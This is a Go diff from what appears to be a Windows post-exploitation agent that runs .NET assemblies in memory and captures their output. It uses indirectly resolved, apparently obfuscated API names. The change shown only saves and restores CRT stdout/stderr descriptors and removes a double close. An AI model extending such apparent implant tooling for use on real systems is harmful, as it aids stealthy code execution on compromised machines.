@@ -172,6 +172,7 @@ var (
 
 	// CRT functions
 	openOsfhandle *syscall.LazyProc
+	dupFunc       *syscall.LazyProc // _dup - saves a CRT file descriptor
 	dup2          *syscall.LazyProc
 	closeFunc     *syscall.LazyProc
 )
@@ -206,7 +207,12 @@ func initIAWindowsAPI() {
 		showWindow = user32.NewProc(iaFnShowWindow())
 
 		openOsfhandle = msvcrt.NewProc(iaFnOpenOsfhandle())
-		dup2 = msvcrt.NewProc(iaFnDup2())
+		// Derive _dup name from _dup2 template (strip trailing "2")
+		dup2Name := iaFnDup2()
+		if len(dup2Name) > 0 && dup2Name[len(dup2Name)-1] == '2' {
+			dupFunc = msvcrt.NewProc(dup2Name[:len(dup2Name)-1])
+		}
+		dup2 = msvcrt.NewProc(dup2Name)
 		closeFunc = msvcrt.NewProc(iaFnClose())
 	})
 }
@@ -326,11 +332,12 @@ func executeWithFileCapture(assemblyBytes []byte, arguments []string) (string, i
 	os.Stdout = oldStdout
 	os.Stderr = oldStderr
 
-	// Close file to flush
+	// Flush Go's file handle (but don't close -- deferred close handles it)
 	if outFile != nil {
-		outFile.Close()
+		outFile.Sync()
 	}
-	closeHandle.Call(fileHandle)
+	// Note: fileHandle is closed by the deferred closeHandle.Call above.
+	// Do NOT close it explicitly here to avoid double-close.
 
 	// Read output from file
 	time.Sleep(100 * time.Millisecond) // Give time for flush
@@ -464,13 +471,20 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	setStdHandle.Call(STD_OUTPUT_HANDLE, uintptr(writePipe))
 	setStdHandle.Call(STD_ERROR_HANDLE, uintptr(writePipe))
 
+	// Save original CRT file descriptors before redirecting
+	var savedCrtFd1, savedCrtFd2 uintptr
+	crtRedirected := false
+	if dupFunc != nil {
+		savedCrtFd1, _, _ = dupFunc.Call(1) // _dup(1) - save original stdout fd
+		savedCrtFd2, _, _ = dupFunc.Call(2) // _dup(2) - save original stderr fd
+	}
+
 	// Critical: Redirect CRT file descriptors
-	// &] Redirecting CRT file descriptors")
 	fd, _, _ := openOsfhandle.Call(uintptr(writePipe), 0x8000)
 	if fd != INVALID_HANDLE_VALUE {
 		dup2.Call(fd, 1)
 		dup2.Call(fd, 2)
-		// &] CRT descriptors redirected")
+		crtRedirected = true
 	}
 
 	// Detect runtime version
@@ -528,9 +542,16 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Restore handles
-	// &] Restoring handles")
 	setStdHandle.Call(STD_OUTPUT_HANDLE, origStdout)
 	setStdHandle.Call(STD_ERROR_HANDLE, origStderr)
+
+	// Restore CRT file descriptors (must happen after Win32 handle restoration)
+	if crtRedirected && dupFunc != nil && savedCrtFd1 != INVALID_HANDLE_VALUE && savedCrtFd2 != INVALID_HANDLE_VALUE {
+		dup2.Call(savedCrtFd1, 1) // Restore CRT stdout
+		dup2.Call(savedCrtFd2, 2) // Restore CRT stderr
+		closeFunc.Call(savedCrtFd1)
+		closeFunc.Call(savedCrtFd2)
+	}
 
 	// Clean up console
 	if consoleCreated {
